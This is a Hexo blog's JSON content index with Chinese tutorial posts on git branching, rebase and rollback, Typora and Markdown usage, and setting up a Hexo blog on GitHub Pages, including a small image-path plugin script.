checkout experimentgit rebase master 这种操作就叫做 **变基（rebase)**。它的原理是首先找到这两个分支（即当前分支 experiment、变基操作的目标基底分支 master） 的最近共同祖先 C2，然后对比当前分支相对于该祖先的历次提交，提取相应的修改并存为临时文件， 然后将当前分支指向目标基底 C3, 最后以此将之前另存为临时文件的修改依序应用。 （译注：写明了 commit id，以便理解，下同)现在回到 master 分支，进行一次快进合并: 12git checkout mastergit merge experiment 此时，C4&#39; 指向的快照就和merge中 C5 指向的快照一模一样了。 这两种整合方法的最终结果没有任何区别，但是变基使得提交历史更加整洁。 你在查看一个经过变基的分支的历史记录时会发现，尽管实际的开发工作是并行的， 但它们看上去就像是串行的一样，提交历史是一条直线没有分叉。 请注意，无论是通过变基，还是通过三方合并，整合的最终结果所指向的快照始终是一样的，只不过提交历史不同罢了。 变基是将一系列提交按照原有次序依次应用到另一分支上，而合并是把最终结果合在一起。 如果提交存在于你的仓库之外，而别人可能基于这些提交进行开发，那么不要执行变基。 总的原则是，只对尚未推送或分享给别人的本地修改执行变基操作清理历史， 从不对已推送至别处的提交执行变基操作， 合并分支——冲突如果在两个不同的分支中，对同一个文件的同一个部分进行了不同的修改，Git 就没法干净的合并它们。Git 会暂停下来，等待你去解决合并产生的冲突。 你可以在合并冲突后的任意时刻使用 git status 命令来查看那些因包含合并冲突而处于未合并（unmerged）状态的文件。任何因包含合并冲突而有待解决的文件，都会以未合并状态标识出来。 Git 会在有冲突的文件中加入标准的冲突解决标记，这样你可以打开这些包含冲突的文件然后手动解决冲突。 12# 启动一个合适的可视化合并工具，并带领你一步一步解决这些冲突git mergetool 等你退出合并工具之后，Git 会询问刚才的合并是否成功。 如果回答“是”，Git 会暂存那些文件以表明冲突已解决。可以再次运行 git status 来确认所有的合并冲突都已被解决。 合并分支——提交1git commit 关于分支的几个常见场景：1.在新的分支上面常规开发【一般是dev分支】 123456# 在确保当前分支是上一步git checkout过来的即可【不放心的话可以git branch 确认下】git add .git commit -m &quot;yyyy&quot;git pull #注意在多人协作push之前,一定先pull下,养成良好的习惯,避免和被人提交的代码冲突,硬合并而照成代码事故】git push # 【再上一步，pull之后如无冲突，即可提交代码】git status #【查看当前工作空间状态】 2.将次分支和并到主分支上【一般是dev分支合并到主分支master上】【dev分支开发完毕,合并到master分支,并推送上线】 12345git checkout dev # 切到dev次分支】git pull #【获取dev分支变化,合并冲突,使本地dev次分支最新】git checkout master #【先切到主分支master上】git merge dev #【一般是git merge dev,将dev开发完的合并到master上】git push -u origin master #【提交master分支到线上master】 3.将主分支和并到次分支上【一般是主分支master合并到dev分支上】【master分支有变动，需要更新开发分支dev上的代码】 12345git checkout master #【切到主分支】git pull #【获取主分支变化,合并冲突,使本地主分支最新】git checkout dev #【先切到次分支dev上】git merge master #【一般是git merge master,将master开发完的合并到dev上】git push -u origin dev #【提交dev分支到线上dev】 版本回退针对部分文件的撤销操作1.有时提交完了才发现漏掉了几个文件没有添加，或提交信息写错了。 可以运行带有 --amend 选项的提交命令来重新提交： 1$ git commit --amend 这个命令会将暂存区中的文件提交。 如果自上次提交以来你还未做任何修改（例如，在上次提交后马上执行了此命令）， 那么快照会保持不变，而你所修改的只是提交信息。文本编辑器启动后，可以看到之前的提交信息。 编辑后保存会覆盖原来的提交信息，也即用一个新的提交替换旧的提交。 2.取消暂存的文件 1git reset HEAD 要取消暂存的文件名 git reset 确实是个危险的命令，如果加上了 --hard 选项则更是如此。 然而在上述场景中，工作目录中的文件尚未修改，因此相对安全一些。 3.撤消对文件的修改 将它还原成上次提交时的样子（或者刚克隆完的样子，或者刚把它放入工作目录时的样子）: 1git checkout -- &lt;file&gt; 请务必记得 git checkout -- &lt;file&gt; 是一个危险的命令。 你对那个文件在本地的任何修改都会消失——Git 会用最近提交的版本覆盖掉它。 除非你确实清楚不想要对那个文件的本地修改了，否则请不要使用这个命令。 针对整个版本的回退操作假设A 和 B 是正常提交， C 和 D 是错误提交，此时HEAD 指针指向 D 提交。现在想把 C 和 D 回退掉。我们只需将 HEAD 指针移动到 B 提交（idCodeB），就可以达到目的。此时回滚目标B的commitid为idCode1，操作如下： 12345678910# 如果保留修改的撤销-&gt;只删掉提交记录：在项目所在目录执行下列操作git reset HEAD~ # 仓库回滚到上一个版本git reset XXX # 仓库回滚到指定版本git reset --soft idCode1 # 仓库回滚到指定版本# 如果把修改记录也干掉：在项目所在目录执行下列操作git reset --hard idCodeBgit reset --hard HEAD^# 如果是提交到远程仓库上，则在远程仓库上同样执行一次相同的命令 然而，由于即使是在本地执行了git reset –hard (B提交的版本号）使得HEAD 指针移动到 B 提交下，但远程仓库的 HEAD 指针依然不变（还在D提交上），故只能使用 -f 选项将提交强制推到远程仓库：git push -f。它会使 HEAD 指针往回移动，从而会失去之后的提交信息。 而git resert则可以既回退代码，又保存错误的提交。(reset和revert的区别详见这篇博客，主要是 revert是生成一次新的commit冲抵原来的commit， reset直接删除某些commit的内容) 12345678910111213# 注意有多个提交需要回退的话，要由新到旧进行 revert，即先D后C。会生成两个新有提交：D’ 和 C’，按A B C D D’ C’的先后顺序依次排列在分支上git revert idCodeDgit revert idCodeCgit revert OLDER_COMMIT^…NEWER_COMMIT # 多个错误提交时批量回退# 回滚最新一次的提交记录：git revert HEAD# 回滚前一次的提交记录：git revert HEAD^# 对历史上的commit回滚git revert # 确认生成的新commit编译成功，也没有文件冲突，可以push到服务器，完成回滚。","categories":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/tags/git/"}]},{"title":"Typora使用指南","slug":"Typora使用指南","date":"2021-12-20T06:14:27.000Z","updated":"2021-12-20T06:14:27.000Z","comments":true,"path":"2021/12/20/Typora使用指南/","link":"","permalink":"https://avalooooooon.github.io/2021/12/20/Typora%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","excerpt":"","text":"文章参考网址官方文档 关于Typora主要使用Github制定的GFM标准。可以在文件 - 偏好设置 - Markdown 语法偏好 - 严格模式 中将标准设置为「更严格地遵循 GFM 标准」。 主题美化在 Typora 中 CSS 被称为「主题」，但其本质仍是 CSS 文件。可以在文件 - 偏好设置 - 主题 - 打开主题文件夹看到这些 CSS 文件。也可以自己修改、新建适合使用需求的 CSS 文件。 Typora 自带了若干主题，可以在 官网 下载更多的主题。 常用写作设置通过打开文件 - 偏好设置定制适合自己编辑习惯的设置。 实时预览通过视图 - 源代码模式或左下角的 &lt;&#x2F;&gt; 按钮或用快捷键command+ /(Mac)进入源代码模式（Source Mode）。 打字机模式&amp;专注模式在视图 - 专注模式 / 打字机模式中勾选使用这两个模式。「打字机模式」使得你所编辑的那一行永远处于屏幕正中。「专注模式」使你正在编辑的那一行保留颜色，而其他行的字体呈灰色。 智能标点可以自动将不是很美观的直引号 “ ‘ 转化为更美观的弯引号 “ ‘ ’ ”。详情见官方文档。 换行在 Markdown 语法中，换行（line break）与换段是不同的。且换行分为软换行和硬换行。 软换行：在 Typora 中可以通过Shift + Enter完成一次软换行。软换行只在编辑界面可见，当文档被导出时换行会被省略。硬换行：通过空格 + 空格 + Shift + Enter完成一次硬换行，或直接插入HTML标签&lt;br&#x2F;&gt;。这也是许多 Markdown 编辑器所原生支持的。硬换行在文档被导出时将被保留，且没有换段的段后距。 换段：通过 Enter 完成一次换段。Typora 会自动帮你完成两次 Shift + Enter 的软换行，从而完成一次换段。这也意味着在 Markdown 语法下，换段是通过在段与段之间加入空行来实现的。 Windows 风格（CR+LF）与 Unix 风格（CR）的换行符CR 表示回车 \\r,即回到一行的开头，而 LF 表示换行\\n ,即另起一行。所以 Windows 风格的换行符本质是「回车 + 换行」，而 Unix 风格的换行符是「换行」。这也是为什么 Unix &#x2F; Mac 系统下的文件，如果在 Windows 系统直接打开会全部在同一行内。 可以在文件 - 偏好设置 - 编辑器 - 默认换行符中对此进行切换。 表格插入不需要按传统的md语法要求的操作，只需要在行内鼠标右键 - 插入 - 表格(注意不能在源代码模式下操作），并输入行数和列数，Typora 就会自动生成一张样式不错的空表格。 图片插入Markdown 原生不太注重图片插入的功能，但可以在 Typora 中： 直接使用右键 - 复制+ Ctrl + V将网络图片、剪贴板图片复制到文档中。 拖动本地图片到文档中 Typora 会自动帮你插入符合 Markdown 语法的图片语句，并给它加上标题。你也完全可以使用图床来保证文档在分享后图片仍能正常显示。 更强大的是，Typora 支持在拖动或 Ctrl + V 网络图片后自动将其保存到本地。可以在文件 - 偏好设置 - 编辑器 - 图片插入中选择复制到哪个路径，什么情况下需要复制。 空格已经把设置改了，现在导出也会保留连续空格。输入连续空格后，会在编辑器视图里保留这些空格，但打印或导出时，这些空格会被省略成一个。在源代码模式下，为每个空格前加一个 \\ 转义符，或者直接使用 HTML 风格的 &amp;nbsp;(No-Break Space) 来保持连续的空格。 表情插入emoji：用:emoji:的形式打出。 链接引用和脚注链接引用类似于我们常在论文末尾看到的「参考文献」的写法，你可以通过[]: 的语法来为你的文档加上链接引用。 脚注即某段话结尾右上角标有数字标记，页面底部进行注释的写法。你可以在需要插入脚注标号的位置写 [^ number ] ，再在下方通过 [^ number ]: 在文档中插入脚注。 注意: 不要遗漏了脚注编号 number 前后的空格 ! 示例[^ 这是一个脚注 ][^ 这是一个脚注 ][^ 这是一个脚注 ]:脚注内容 YAML front-matterTypora 支持在文档头部加上基于 YAML 的 front-matter 信息，这一特性适用于把 Markdown 文档分类归档上传到用 Hexo 框架搭建的博客中。 LaTeXTypora 原生支持 LaTeX 语法，有两种方式输入 LaTeX 风格的数学公式：行内公式（inline）：用$…$ 括起公式，公式会出现在行内。块间公式（display）：用$$…$$ 括起公式（注意 $$ 后需要换行），公式会默认显示在行中间。 其它使用范例typora 画流程图、时序图(顺序图)、甘特图1、横向流程图源码格式：横向流程图 123456graph LRA[方形] --&gt;B(圆角) B --&gt; C&#123;条件a&#125; C --&gt;|a=1| D[结果1] C --&gt;|a=2| E[结果2] F[横向流程图] 2、竖向流程图源码格式： 竖向流程图 123456graph TDA[方形] --&gt; B(圆角) B --&gt; C&#123;条件a&#125; C --&gt; |a=1| D[结果1] C --&gt; |a=2| E[结果2] F[竖向流程图] 3、标准流程图源码格式：标准流程图 123456789st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st-&gt;op-&gt;condcond(yes)-&gt;io-&gt;econd(no)-&gt;sub1(right)-&gt;op 4、标准流程图源码格式（横向）：横向标准流程图 123456789st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st(right)-&gt;op(right)-&gt;condcond(yes)-&gt;io(bottom)-&gt;econd(no)-&gt;sub1(right)-&gt;op 5、UML时序图源码样例：UML时序图 12345对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象A-&gt;对象B: 你真的好吗？ 6、UML时序图源码复杂样例：复杂UML 1234567891011Title: 标题：复杂使用对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象B-&gt;小三: 你好吗小三--&gt;&gt;对象A: 对象B找我了对象A-&gt;对象B: 你真的好吗？Note over 小三,对象B: 我们是朋友participant CNote right of C: 没人陪我玩 7、UML标准时序图样例：标准UML 123456789101112%% 时序图例子,-&gt; 直线，--&gt;虚线，-&gt;&gt;实线箭头 sequenceDiagram participant 张三 participant 李四 张三-&gt;王五: 王五你好吗？ loop 健康检查 王五-&gt;王五: 与疾病战斗 end Note right of 王五: 合理 食物 &lt;br/&gt;看医生... 李四--&gt;&gt;张三: 很好! 王五-&gt;李四: 你怎么样? 李四--&gt;王五: 很好! 8、甘特图样例：甘特图 12345678910111213141516171819%% 语法示例 gantt dateFormat YYYY-MM-DD title 软件开发甘特图 section 设计 需求 :done, des1, 2014-01-06,2014-01-08 原型 :active, des2, 2014-01-09, 3d UI设计 : des3, after des2, 5d 未来任务 : des4, after des3, 5d section 开发 学习准备理解需求 :crit, done, 2014-01-06,24h 设计框架 :crit, done, after des2, 2d 开发 :crit, active, 3d 未来任务 :crit, 5d 耍 :2d section 测试 功能测试 :active, a1, after des3, 3d 压力测试 :after a1 , 20h 测试报告 : 48h","categories":[{"name":"文档编写","slug":"文档编写","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/"},{"name":"编辑器","slug":"文档编写/编辑器","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/%E7%BC%96%E8%BE%91%E5%99%A8/"}],"tags":[]},{"title":"Markdown笔记","slug":"Markdown笔记","date":"2021-12-20T06:12:19.000Z","updated":"2021-12-20T06:12:19.000Z","comments":true,"path":"2021/12/20/Markdown笔记/","link":"","permalink":"https://avalooooooon.github.io/2021/12/20/Markdown%E7%AC%94%E8%AE%B0/","excerpt":"","text":"typora快捷键 标题#一级标题：## 二级标题### 三级标题#### 四级标题 段落在 Markdown 语法中，换行（line break）与换段是不同的。且换行分为软换行和硬换行。换行：两个以上空格加回车，或直接插入HTML标签&lt;br&#x2F;&gt; 软换行：在 Typora 中可以通过 Shift + Enter 完成一次软换行。软换行只在编辑界面可见，当文档被导出时换行会被省略。硬换行：通过 空格 + 空格 + Shift + Enter 完成一次硬换行，或直接插入HTML标签&lt;br&#x2F;&gt;。这也是许多 Markdown 编辑器所原生支持的。硬换行在文档被导出时将被保留，且没有换段的段后距。 换段：通过在段与段之间加入空行来实现。在段落后面使用一个空行来表示重新开始一个段落。 分隔线：在一行中用三个以上的星号、减号、下划线来建立一个分隔线，行内不能有其他东西。效果如下： 在星号或是减号中间插入空格没有影响。下面每种写法都可以建立分隔线：***---___* * * 文本~~要删除的文字~~: 要删除的文字&lt;u&gt;带下划线文本&lt;&#x2F;u&gt;: 带下划线文本**演示粗体**: 演示粗体*演示斜体* : 演示斜体 脚注：创建脚注格式为： 主段落[^ 脚注01 ] [^ 脚注01 ]: 这是脚注内容。效果如下： 主段落^ 脚注01 。 代码段内插入代码片段`代码内容` ，效果为 代码内容 整段插入代码片段1. 用一对``` 包裹一段代码，并指定一种语言（也可以不指定）：``` pythonprint``` 1print 2. 用段落前缩进(4 个空格或者一个制表符（Tab ）)的方式显示代码块。注意代码要在一个新段开始，否则无法正确显示为代码格式。 区块引用在段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号。一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套，以此类推：&gt; 区块引用&gt;&gt; 第一层嵌套&gt;&gt;&gt; 第二层嵌套&gt; 这个位置，这样是无效的 区块引用 第一层嵌套 第二层嵌套这个位置，尝试用一个&gt;是无效的 在列表内添加区块需要在 &gt; 前添加四个空格的缩进。 列表无序列表使用*、+或-作为列表标记，这些标记后面要添加一个空格，然后再填写内容：+ 第一项+ 第二项 显示为： 第一项 第二项 有序列表使用数字并加上 . 号来表示：1. 第一项2. 第二项3. 第三项 显示为： 第一项 第二项 第三项 列表嵌套只需在子列表中的选项前面添加四个空格即可1. 第一项： - 第一项嵌套的第一个元素 - 第一项嵌套的第二个元素 显示为： 第一项： 第一项嵌套的第一个元素 第一项嵌套的第二个元素 链接和图片插入链接[链接名称](链接地址)或者&lt;链接地址&gt;链接名称或者https://avalooooooon.github.io/index 高级链接: 可以通过变量来设置一个链接，变量赋值在文档末尾进行：这个链接用 1 作为网址变量 [Google][1]: Google这个链接用avalon作为网址变量[mygithub][avalon]: mygithub然后在文档的结尾为变量赋值（网址） 插入图片可以是本地图片也可以是网络图片。格式：![alt 属性文本](图片地址 “可选标题”) Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 &lt;img&gt; 标签&lt;img src&#x3D;”图片链接” width&#x3D;”50%”&gt; 表格表格格式使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行| First Header | Second Header || ————- | ————- || Content Cell | Content Cell || Content Cell | Content Cell | First Header Second Header Content Cell Content Cell Content Cell Content Cell 对齐方式可以设置表格的对齐方式：-: 设置内容和标题栏居右对齐。:- 设置内容和标题栏居左对齐。:-: 设置内容和标题栏居中对齐。实例如下：| 左对齐 | 右对齐 | 居中对齐 || :—–| —-: | :—-: || 单元格 | 单元格 | 单元格 || 单元格 | 单元格 | 单元格 | 左对齐 右对齐 居中对齐 单元格 单元格 单元格 单元格 单元格 单元格 公式使用两个美元符$$ 包裹 TeX 或 LaTeX 格式的数学公式来实现。提交后，问答和文章页会根据需要加载 Mathjax 对数学公式进行渲染。如：显示效果为：$$\\mathbf{V}_1 \\times \\mathbf{V}_2 &#x3D; \\begin{vmatrix}\\mathbf{i} &amp; \\mathbf{j} &amp; \\mathbf{k} \\\\frac{\\partial X}{\\partial u} &amp; \\frac{\\partial Y}{\\partial u} &amp; 0 \\\\frac{\\partial X}{\\partial v} &amp; \\frac{\\partial Y}{\\partial v} &amp; 0 \\\\end{vmatrix}${$tep1}{\\style{visibility:hidden}{(x+1)(x+1)}}$$ 转义Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：文本加粗** 正常显示星号 ** 使用HTML元素不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。目前支持的 HTML 元素有：&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;等 ，如：&lt;kbd&gt;Command&lt;&#x2F;kbd&gt;+&lt;kbd&gt;C&lt;&#x2F;kbd&gt; :使用 Command+C 组合键进行复制","categories":[{"name":"文档编写","slug":"文档编写","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/"},{"name":".md","slug":"文档编写/md","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/md/"}],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://avalooooooon.github.io/tags/markdown/"}]},{"title":"建站记录","slug":"建站记录","date":"2021-12-19T06:53:04.000Z","updated":"2022-09-21T08:56:14.567Z","comments":true,"path":"2021/12/19/建站记录/","link":"","permalink":"https://avalooooooon.github.io/2021/12/19/%E5%BB%BA%E7%AB%99%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Part1 环境搭建安装nodejs12node -v npm -v #查看版本 安装git1git --version #查看版本 创建博客文件夹并安装hexo自己在想要的位置创建文件夹blog，在该文件夹中新建终端并运行以下命令： 12npm install -g hexo-clihexo -v 在Windows中，如果出现”‘hexo’不是内部或外部命令，也不是可运行的程序”，需要找到电脑中新安装的hexo的位置，并将hexo.cmd所在文件夹的路径添加到系统变量的PATH中。 可能出现的问题运行npm install -g hexo-cli时，可能提示没有权限。这里强烈建议不要用sudo方式强行获得权限。解决方法：第一步，赋予目录权限；第二步，安装hexo: 12sudo chown -R `whoami` /usr/local/lib/node_modules #这里不用改路径npm install hexo-cli -g 至此安装部分已经结束。下面对hexo进行初始化，给自己准备存放hexo主要内容的文件夹取一个名字（比如myblog），运行下列命令： 123hexo init myblogcd myblognpm install 可以看到，myblog目录下出现了：–node_modules: 依赖包–public：存放生成的页面–scaffolds：生成文章的一些模板–source：用来存放你的文章–themes：主题–_config.yml：博客的配置文件 运行下列命令打开hexo的服务，在浏览器输入localhost:4000就可以看到生成的博客了： 12hexo ghexo server 创建Github库并绑定SSH首先在自己的github下new一个和自己注册github时的用户名xxx同名的仓库，后面加.github.io。也就是新仓库的名字叫xxx.github.io。接下来生成SSH。依次运行下列命令： 12345git config --global user.name &quot;yourname&quot; #github用户名git config --global user.email &quot;youremail&quot; #github绑定的邮箱git config user.namegit config user.email #检查一下输对没有ssh-keygen -t rsa -C &quot;youremail&quot; #创建SSH，一路回车 找到～&#x2F;.ssh文件夹。（Mac显示隐藏文件夹，同时按下三个组合键：Shift + Command + . ）在自己GitHub的setting中找到SSH keys，点击New SSH key。将id_rsa.pub里面的信息全部复制进去并保存。查看是否成功： 1ssh -T git@github.com 将hexo托管到个人Github先安装deploy-git ，也就是部署的命令，这样才能用命令部署到GitHub: 1npm install hexo-deployer-git --save 在myblog文件夹下打开站点配置文件*_config.yml*，翻到最后，修改为 1234deploy: type: git repo: git@github.com:xxx/xxx.github.io.git branch: master 准备就绪后, 123hexo clean #清除了之前生成的东西，也可以不加。hexo g #生成静态文章，hexo generate的缩写hexo d #部署文章，hexo deploy的缩写,,可与hexo g合并为 hexo d -g 过一会儿就可以在http://xxx.github.io 这个网站看到博客了。 写文章使用指令新建一篇文章： 1hexo new [layout] &lt;title&gt; 写完后，运行下列代码以部署更新。 123hexo cleanhexo ghexo d #可与hexo g合并为 hexo d -g 关于[layout]Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径。自己自定义的其他布局和 post 相同，都将储存到 source&#x2F;_posts 文件夹。可以通过 publish 命令将草稿移动到 source&#x2F;_posts 文件夹： 1hexo publish [layout] &lt;title&gt; 草稿默认是不会显示在页面中的，可在执行时加上 –draft 参数，或是把 render_drafts 参数设为 true来预览草稿。也可以编辑现有的layout，比如post的layout默认是hexo\\scaffolds\\post.md比如想添加categories（文章分类目录），以免每次手工输入，只需要修改这个文件添加一行，如下： 1234title: &#123; &#123; title &#125; &#125; #文章页面上的显示名称，可以任意修改，不会出现在URL中date: &#123; &#123; date &#125; &#125; #文章生成时间，一般不改，当然也可以任意修改categories: #文章分类目录，可以为空tags: #文章标签，可空，多标签请用格式[tag1,tag2,tag3]， 请注意，大括号与大括号之间多加了个空格，否则会被转义，不能正常显示。 注意，所有文件：后面都必须有个空格，不然会报错。 写作时可能用到的插件1.插入图片 12cd blog/myblog # 进入本地博客文件夹npm install https://github.com/CodeFalling/hexo-asset-image --save 接下来打开hexo的配置文件_config.yml，找到 post_asset_folder，把这个选项从false改成true。最后打开&#x2F;node_modules&#x2F;hexo-asset-image&#x2F;index.js，将内容更换为下面的代码（参考了这篇博客)。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#x27;use strict&#x27;;var cheerio = require(&#x27;cheerio&#x27;);// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) &#123; return str.split(m, i).join(m).length;&#125;var version = String(hexo.version).split(&#x27;.&#x27;);hexo.extend.filter.register(&#x27;after_post_render&#x27;, function(data)&#123; var config = hexo.config; if(config.post_asset_folder)&#123; var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, &#x27;/&#x27;, 1) + 1; else var beginPos = getPosition(link, &#x27;/&#x27;, 3) + 1; // In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;. var endPos = link.lastIndexOf(&#x27;/&#x27;) + 1; link = link.substring(beginPos, endPos); var toprocess = [&#x27;excerpt&#x27;, &#x27;more&#x27;, &#x27;content&#x27;]; for(var i = 0; i &lt; toprocess.length; i++)&#123; var key = toprocess[i]; var $ = cheerio.load(data[key], &#123; ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false &#125;); $(&#x27;img&#x27;).each(function()&#123; if ($(this).attr(&#x27;src&#x27;))&#123; // For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;. var src = $(this).attr(&#x27;src&#x27;).replace(&#x27;\\\\&#x27;, &#x27;/&#x27;); if(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp; !/^\\s*\\//.test(src)) &#123; // For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed. // In addition, to support multi-level local directory. var linkArray = link.split(&#x27;/&#x27;).filter(function(elem)&#123; return elem != &#x27;&#x27;; &#125;); var srcArray = src.split(&#x27;/&#x27;).filter(function(elem)&#123; return elem != &#x27;&#x27; &amp;&amp; elem != &#x27;.&#x27;; &#125;); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join(&#x27;/&#x27;); $(this).attr(&#x27;src&#x27;, config.root + link + src); console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src); &#125; &#125;else&#123; console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;); console.info&amp;&amp;console.info($(this)); &#125; &#125;); data[key] = $.html(); &#125; &#125;&#125;); 现在就可以插入图片了，比如hexo new post photo之后就在source&#x2F;_posts生成photo.md文件和photo文件夹，我们把要插入的图片复制到photo文件夹内，在photo.md文件里面按markdown的标准写,（我的文件名是head.jpeg）比如 Part2 基本配置hexo基本配置——_config.yml在文件根目录下的_config.yml，就是整个hexo框架的配置文件了。可以在里面修改大部分的配置。详细可参考官方的配置描述。 网站参数 描述title 网站标题subtitle 网站副标题description 主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。author 用于主题显示文章的作者language 网站使用的语言timezone 网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：America&#x2F;New_York, Japan, 和 UTC 。 网址参数 描述url 你的网站域名root 网站根目录permalink 文章的永久链接格式permalink_defaults 用于主题显示文章的作者 permalink，也就是你生成某个文章时的那个链接格式。比如我新建一个文章叫temp.md，那么这个时候他自动生成的地址就是http://yoursite.com/2018/09/05/temp。以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找永久链接 。 参数 描述:year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F; 2013&#x2F;07&#x2F;14&#x2F;hello-world:year-:month-:day-:title.html :year-:month-:day-:title.html:category&#x2F;:title foo&#x2F;bar&#x2F;hello-world 再往下翻，中间这些都默认就好了。 12345678theme: landscape # Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: &lt;repository url&gt; branch: [branch] theme：主题名deploy：网站部署。repo就是仓库(Repository)的简写。branch选择仓库的哪个分支。这个在之前进行github page部署的时候已经修改过了，不再赘述。而这个在后面进行双平台部署的时候会再次用到。 Front-matterFront-matter 是文件最上方以 — 分隔的区域，用于指定个别文件的变量，就是.md文件最上面的这部分内容(下面的例子是YAML语法）： 1234567title: Hello Worlddate: 2013/7/13 20:46:25author:tags:- PS3- Games--- 注意，所有文件-后面都必须有个空格!基本格式要求：1，YAML大小写敏感；2，使用缩进代表层级关系；3，缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格） 部分标签详解：layout：布局。指定要使用的模版样式。如果不指定这个将会使用根目录/_config.yml中的默认配置default_layout: post。title： 标题。默认Markdown的文件标题。date： 建立日期。默认文件创建时间。author： 作者。默认根 _config.yml中的 author。img: 文章特征图。默认featureImages 中的某个值。updated： 更新日期comments： 开启文章的评论功能（国内好像用不了disqus？）。hexo默认支持disqus评论功能是comments：true需要先去disqus 官网注册一下账号：https://disqus.com/profile/signup/然后进入到设置：https://disqus.com/home/settings/因为这个评论插件是要登陆评论的，先配置你的个人信息，看左边的第一行Profile和Username，然后在主题_config.yml下面添加disqus_shortname:注册disqus时你自己设置的名字就可以在文章下面看评论功能了。 12Disqus settings（https://disqus.com/）disqus_username: 你的Username disqus设置时可能需要清除一下缓存，否则可能会出现加载不出来的情况。 通过常用的hexo上传方式(hexo clean，清除hexo缓存 + hexo g，生成对应html文件 + hexo d，将hexo对应的修改上传到git上)。tags： 给文章添加标签，使其能在标签页中显示。不适用于分页。标签没有顺序和层次。一篇文章可以设置多个标签。categories： 整体内容基本与 tags一致，区别在于在进行分类管理的时候此标签下的内容是有严格的顺序和层次的，tags没有。不适用于分页。因为hexo的分类具有层次关系，同一文章不能同时存在两个同级分类中，所以下面这种方式 123categories:- Diary- Life 会使分类Life成为Diary的子分类，而不是并列分类。因此，有必要为文章选择尽可能准确的分类。 如果你需要为文章添加多个分类，可以尝试以下 list 中的方法: 1234categories:- [Diary, PlayStation]- [Diary, Games]- [Life] 此时这篇文章同时包括三个分类： PlayStation 和 Games 分别都是父分类 Diary 的子分类，同时 Life 是一个没有子分类的分类。permalink: 覆盖文章网址。直白的说就是静态文件的存放地址。如果不指定这个将会使用根目录/_config.yml中的默认配置permalink: :year/:month/:day/:title/。如果指定的文件夹不存在就会创建一个。这里如何设置最后在页面中使用的连接地址就会是什么样的，例如上面这种方式最终生成的文章的连接地址就是xxx.github.io/2022/08/11/：title/。keywords： 仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）。用于SEO优化，这篇文章包含哪些关键词。有人百度这些关键词的时候可能就会显示本页面。top：默认true。推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章。配置 默认值 含义cover false 表示该文章是否需要加入到首页轮播封面中coverImg 无 表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片password 无 文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc ture 是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax false 是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml文件中也需要开启才行summary 无 文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要reprintPolicy 无 文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个 文章的front-matter，用 hexo n 新建的时候会自动生成，其他时候手动写。在draft文件夹里面更改post.md可以更改自动生成的模板。 